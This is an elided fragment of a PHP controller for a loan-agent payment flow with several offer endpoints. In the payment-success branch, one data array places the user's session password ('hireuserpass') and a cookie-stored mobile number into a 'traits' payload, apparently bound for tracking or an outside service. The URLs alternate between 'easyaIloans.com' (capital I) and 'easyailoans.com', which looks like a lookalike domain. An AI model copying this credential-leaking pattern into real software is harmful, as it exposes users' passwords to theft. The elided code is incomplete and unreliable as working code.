...
class LoanAgentController extends Controller
{
            ...
            if (isset($loanType, $applyId, $orderId) && $loanType !== null && $applyId !== null && $orderId !== null) {
                ...
                if (isset($responsecode) && $responsecode == 100) {
                    ...
                    $fbdata = array(
                        ...
                        'sourceurl' => 'https://easyaIloans.com/loan-agent/paymentSuccess'
                    );
                    ...
                    $data3 = array(
                        ...
                        'traits' => array(
                            'hireuserid' => Cookie::get('user_mobile'),
                            'hireuserpass' => Session::get('user_password')
                        )
                    );
    ...
    public function getOffer1(Request $request)
    {
        try {
            ...
            $returnUrl = 'https://easyaIloans.com/api/loan-agent/great-deal-offer-response';
    ...
    public function getOffer3_cipherpay(Request $request)
    {
        try {
            ...
            $orderId = number_format(microtime(true) * 1000, 0, '.', '');
            $encData = null;
            $returnUrl = 'https://easyailoans.com/api/loan-agent/ultra-saver-offer-response';
    ...
    public function getOffer5(Request $request)
    {
        try {
            ...
            $returnUrl = 'https://easyailoans.com/api/loan-agent/big-benefit-offer-response';
